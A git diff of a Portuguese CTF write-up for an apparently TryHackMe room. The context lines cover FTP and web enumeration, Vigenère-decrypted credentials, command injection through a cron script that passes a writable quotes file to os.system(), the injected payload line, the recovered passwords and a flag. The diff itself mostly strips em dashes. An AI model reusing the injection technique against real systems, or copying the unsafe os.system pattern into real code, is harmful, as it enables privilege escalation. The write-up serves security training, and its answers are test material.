@@ -28,8 +28,8 @@
 3. [Análise Web](#3-análise-web)
 4. [Quebra de Criptografia](#4-quebra-de-criptografia)
 5. [Acesso Inicial via SSH](#5-acesso-inicial-via-ssh)
-6. [Escalada de Privilégios — weston → cage](#6-escalada-de-privilégios--weston--cage)
-7. [Escalada de Privilégios — cage → root](#7-escalada-de-privilégios--cage--root)
+6. [Escalada de Privilégios weston → cage](#6-escalada-de-privilégios--weston--cage)
+7. [Escalada de Privilégios cage → root](#7-escalada-de-privilégios--cage--root)
 8. [Flags](#8-flags)
 9. [Vulnerabilidades e Recomendações](#9-vulnerabilidades-e-recomendações)
 
@@ -80,13 +80,13 @@ cat dad_tasks | base64 -d
 
 **Output:**
 ```
-Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
+Qapw Eekcl Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
 Sfw. Kajnmb xsi owuowge
 ...
 Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
 ```
 
-Texto ainda cifrado — análise indica **Cifra de Vigenère**.
+Texto ainda cifrado, análise indica **Cifra de Vigenère**.
 
 > **Vulnerabilidade:** Acesso anônimo ao FTP expondo arquivos com credenciais codificadas.
 
@@ -108,7 +108,7 @@ gobuster dir -u http://10.66.142.219 -w /usr/share/wordlists/dirb/common.txt
 /scripts    (Status: 301)
 ```
 
-O diretório `/scripts/` continha 5 roteiros gerados aleatoriamente — utilizados como distração/contexto temático do room.
+O diretório `/scripts/` continha 5 roteiros gerados aleatoriamente utilizados como distração/contexto temático do room.
 
 O site (`/index.html`) é um blog temático do Nicolas Cage com informações sobre o personagem **Weston** (filho).
 
@@ -116,13 +116,13 @@ O site (`/index.html`) é um blog temático do Nicolas Cage com informações so
 
 ## 4. Quebra de Criptografia
 
-### 4.1 Decifrando o dad_tasks — Credenciais do Weston
+### 4.1 Decifrando o dad_tasks Credenciais do Weston
 
 O texto do `dad_tasks` estava cifrado com **Vigenère**. Utilizando a ferramenta [guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) com análise automática (Kasiski Test):
 
 **Texto cifrado:**
 ```
-Qapw Eekcl - Pvr RMKP...
+Qapw Eekcl Pvr RMKP...
 Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
 ```
 
@@ -139,7 +139,7 @@ In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
 
 ### 4.2 Decifrando email do cage — Credenciais do Root
 
-Após acesso ao sistema (seção 6), encontramos nos emails do cage a string `haiinspsyanileph`. O email dava a dica: *"obsessed with my face"* — referência ao filme **Face/Off**.
+Após acesso ao sistema (seção 6), encontramos nos emails do cage a string `haiinspsyanileph`. O email dava a dica: *"obsessed with my face"* referência ao filme **Face/Off**.
 
 Usando Python para decifrar com chave `FACE`:
 
@@ -182,11 +182,11 @@ Broadcast message from cage@national-treasure:
 "Put... the bunny... back... in the box." — Con Air
 ```
 
-Acesso obtido como `weston`. Mensagens de broadcast do usuário `cage` surgindo a cada minuto — indica **cron job em execução**.
+Acesso obtido como `weston`. Mensagens de broadcast do usuário `cage` surgindo a cada minuto indica **cron job em execução**.
 
 ---
 
-## 6. Escalada de Privilégios — weston → cage
+## 6. Escalada de Privilégios weston → cage
 
 ### Enumeração pós-acesso
 
@@ -195,7 +195,7 @@ id
 # uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
 ```
 
-`weston` faz parte do grupo `cage` — vetor de ataque identificado.
+`weston` faz parte do grupo `cage` vetor de ataque identificado.
 
 ```bash
 ls -la /opt/.dads_scripts/
@@ -215,10 +215,10 @@ O grupo `cage` tem permissão **rw** no arquivo `.quotes`.
 import os, random
 lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
 quote = random.choice(lines)
-os.system("wall " + quote)  # ← Input não sanitizado!
+os.system("wall " + quote)  #Input não sanitizado!
 ```
 
-O script lê `.quotes` e passa diretamente para `os.system()` sem sanitização — **Command Injection**.
+O script lê `.quotes` e passa diretamente para `os.system()` sem sanitização **Command Injection**.
 
 ### Exploração
 
@@ -243,11 +243,11 @@ echo "x; cat /home/cage/email_backup/email_3 > /tmp/email3.txt; chmod 777 /tmp/e
 cat /tmp/email3.txt
 ```
 
-Email revelou a string cifrada `haiinspsyanileph` → decifrada para `cageisnotalegend` (seção 4.2).
+Email revelou a string cifrada `haiinspsyanileph` decifrada para `cageisnotalegend` (seção 4.2).
 
 ---
 
-## 7. Escalada de Privilégios — cage → root
+## 7. Escalada de Privilégios cage → root
 
 Com a senha do root obtida via análise dos emails:
 
@@ -288,12 +288,6 @@ THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
 | 3 | Command Injection via cron job (RCE) | 🔴 Crítica | Sanitizar inputs; usar `subprocess` com lista de args |
 | 4 | Permissões incorretas em arquivo lido por processo privilegiado | 🔴 Alta | Aplicar princípio do menor privilégio; `chmod 640 .quotes` |
 | 5 | Senha fraca do root armazenada em texto claro | 🔴 Crítica | Senha forte + desabilitar login root via SSH |
-
----
-
-## 🔗 Relatório Completo
-
-O relatório profissional completo em formato `.docx` (com CVSS, cadeia de ataque e recomendações detalhadas) está disponível neste repositório.
 
 ---
 
